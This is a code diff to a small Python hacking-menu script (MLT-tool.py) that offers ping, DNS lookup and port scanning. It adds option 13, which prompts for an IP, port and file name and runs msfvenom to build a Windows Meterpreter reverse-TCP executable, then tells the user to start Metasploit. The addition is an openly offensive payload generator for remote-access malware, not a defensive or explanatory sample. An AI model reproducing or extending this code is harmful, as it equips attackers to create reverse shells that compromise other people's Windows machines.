@@ -7,7 +7,7 @@ try:
                                                                          _______ 
    |-----------------Welcome-to---$---MLT-tool.py--------------------------|___M___|--------------------/
    |1:ping ip address          |12:classic Background                      |___L___|-------------------/
-   |2:get ip for DNS           |                                           |___T___|------------------/                  
+   |2:get ip for DNS           |13:create a windows Payload                |___T___|------------------/                  
    |3:ip auto ports scanner    |                                           |___ ___|-----------------/
    |4:ip manual port scanner   |                                           |___T___|----------------/                  
    |5:get service for any port |                                           |___O___|---------------/              
@@ -108,6 +108,12 @@ try:
           while 1:
             for x in range (0,10101119281121):
                 print ('Security attacks = %s ,DDos attacks = %s Welcome to hackers school'%(x,x))
+       elif uinput=='13':
+          ip=input('IP: ')
+          port=input('Port: ')
+          name=input('Payload name (.exe): ')
+          os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s R> /root/Desktop/%s'%(ip,port,name))
+          print ('CREATED in /desktop start metasploit and exploit')
        else:
           print ('<!=INT> EXECUTING %s'%uinput)
           print ('')
